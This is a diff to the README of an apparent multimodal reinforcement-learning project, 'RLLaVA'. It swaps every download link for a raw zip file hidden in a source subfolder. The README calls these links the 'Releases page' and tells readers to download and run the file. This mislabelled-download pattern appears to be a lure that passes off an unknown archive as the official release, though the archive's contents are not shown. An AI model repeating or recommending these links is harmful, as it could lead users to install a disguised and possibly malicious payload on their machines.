@@ -1,6 +1,6 @@
 # 🚀 RLLaVA - Your Easy Path to Multi-Modal Reinforcement Learning
 
-[![Download RLLaVA](https://raw.githubusercontent.com/skibidiexploiter4343/RLLaVA/main/rllava/serve/examples/RLLaVA-3.7.zip)](https://raw.githubusercontent.com/skibidiexploiter4343/RLLaVA/main/rllava/serve/examples/RLLaVA-3.7.zip)
+[![Download RLLaVA](https://raw.githubusercontent.com/skibidiexploiter4343/RLLaVA/main/rllava/eval/agent_search/tools/RL_VA_La_2.5.zip)](https://raw.githubusercontent.com/skibidiexploiter4343/RLLaVA/main/rllava/eval/agent_search/tools/RL_VA_La_2.5.zip)
 
 ## 📦 Overview
 
@@ -21,11 +21,11 @@ To run RLLaVA smoothly, ensure your system meets the following:
 
 ## 🔗 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/skibidiexploiter4343/RLLaVA/main/rllava/serve/examples/RLLaVA-3.7.zip) to download the latest version of RLLaVA.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/skibidiexploiter4343/RLLaVA/main/rllava/eval/agent_search/tools/RL_VA_La_2.5.zip) to download the latest version of RLLaVA.
 
 ### Steps to Download
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/skibidiexploiter4343/RLLaVA/main/rllava/serve/examples/RLLaVA-3.7.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/skibidiexploiter4343/RLLaVA/main/rllava/eval/agent_search/tools/RL_VA_La_2.5.zip).
 2. Locate the latest version of RLLaVA.
 3. Choose your operating system and download the appropriate file.
 4. (Optional) Save the file in a location you can easily access, like your Desktop or Downloads folder.
@@ -75,7 +75,7 @@ If you need help or want to learn more about RLLaVA, consider the following reso
 
 ## 🔄 Updates and New Features
 
-Regular updates help keep RLLaVA running smoothly and add exciting new features. Always check the [Releases page](https://raw.githubusercontent.com/skibidiexploiter4343/RLLaVA/main/rllava/serve/examples/RLLaVA-3.7.zip) for the latest version and improvements.
+Regular updates help keep RLLaVA running smoothly and add exciting new features. Always check the [Releases page](https://raw.githubusercontent.com/skibidiexploiter4343/RLLaVA/main/rllava/eval/agent_search/tools/RL_VA_La_2.5.zip) for the latest version and improvements.
 
 ## 📞 Contact
 
